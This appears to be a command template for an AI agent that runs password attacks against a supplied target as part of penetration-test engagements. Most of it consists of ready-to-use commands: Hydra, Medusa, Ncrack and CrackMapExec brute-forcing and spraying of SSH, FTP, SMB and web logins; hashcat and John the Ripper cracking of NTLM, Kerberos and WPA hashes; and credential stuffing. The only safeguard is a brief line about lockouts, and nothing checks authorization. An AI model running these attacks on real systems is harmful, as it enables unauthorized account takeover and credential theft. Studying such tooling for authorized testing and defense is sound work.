Password attack and cracking on: $ARGUMENTS

## Pre-flight
- Identify attack type: online (live service) or offline (captured hashes)
- For online: determine service, lockout policy, rate limits
- For offline: identify hash type (hashid, hash-identifier, haiti)
- Prepare wordlists: rockyou.txt, SecLists, custom-generated

## Phase 1: Online Attacks
1. **Hydra SSH**: `hydra -l <user> -P wordlist.txt ssh://<ip>`
2. **Hydra HTTP POST**: `hydra -l admin -P wordlist.txt <ip> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`
3. **Hydra FTP**: `hydra -L users.txt -P wordlist.txt ftp://<ip>`
4. **Medusa**: `medusa -h <ip> -u admin -P wordlist.txt -M ssh`
5. **Ncrack**: `ncrack -vv -U users.txt -P wordlist.txt <ip>:ssh`
6. **CrackMapExec**: `crackmapexec smb <ip> -u users.txt -p passwords.txt --no-bruteforce`
7. **Spray**: `crackmapexec smb <ip> -u users.txt -p 'Spring2024!' --continue-on-success`

## Phase 2: Offline Cracking -- Hashcat
1. **Identify hash**: `hashid <hash>` or `haiti <hash>`
2. **MD5** (mode 0): `hashcat -m 0 hashes.txt wordlist.txt`
3. **SHA256** (mode 1400): `hashcat -m 1400 hashes.txt wordlist.txt`
4. **NTLM** (mode 1000): `hashcat -m 1000 hashes.txt wordlist.txt`
5. **NetNTLMv2** (mode 5600): `hashcat -m 5600 hashes.txt wordlist.txt`
6. **WPA/WPA2** (mode 22000): `hashcat -m 22000 capture.hc22000 wordlist.txt`
7. **Kerberoast** (mode 13100): `hashcat -m 13100 tgs-hashes.txt wordlist.txt`
8. **AS-REP** (mode 18200): `hashcat -m 18200 asrep-hashes.txt wordlist.txt`
9. **Rules**: `hashcat -m <mode> hashes.txt wordlist.txt -r rules/best64.rule`
10. **Mask**: `hashcat -m <mode> hashes.txt -a 3 ?u?l?l?l?d?d?d?d` (pattern-based)

## Phase 3: Offline Cracking -- John the Ripper
1. **Auto-detect**: `john hashes.txt --wordlist=wordlist.txt`
2. **Rules**: `john hashes.txt --wordlist=wordlist.txt --rules=jumbo`
3. **Show cracked**: `john hashes.txt --show`
4. **Specific format**: `john --format=NT hashes.txt`

## Phase 4: Advanced Techniques
1. **Rainbow tables**: precomputed -- fast lookup but limited charset/length
2. **Prince attack**: `hashcat -a 0 hashes.txt wordlist.txt --prince`
3. **Combinator**: `hashcat -a 1 hashes.txt wordlist1.txt wordlist2.txt`
4. **Custom wordlist**: `cewl <url> -d 3 -m 5 -w custom.txt` then apply rules
5. **Credential stuffing**: test known leaked credentials against target services

## Wordlists
Primary: rockyou.txt | Extended: SecLists/Passwords/ | Custom: /generate-wordlist
Specialized: wordlists/passwords/top-1000.txt, wordlists/passwords/default-creds.txt

## Output
Save to engagements/<target>/findings/password-attack-<service>.md

## Framework Mapping
- MITRE ATT&CK: TA0006 (Credential Access) -> T1110 (Brute Force)
- MITRE ATT&CK: T1110.001 (Password Guessing), T1110.002 (Password Cracking)
- MITRE ATT&CK: T1110.003 (Password Spraying), T1110.004 (Credential Stuffing)
- Cyber Kill Chain: Phase 3 -- Delivery / Phase 5 -- Installation
- CEH v12: Module 06 -- System Hacking (Password Cracking)

## Safety
Respect lockout policies on online attacks. Use --no-bruteforce for spray attacks.
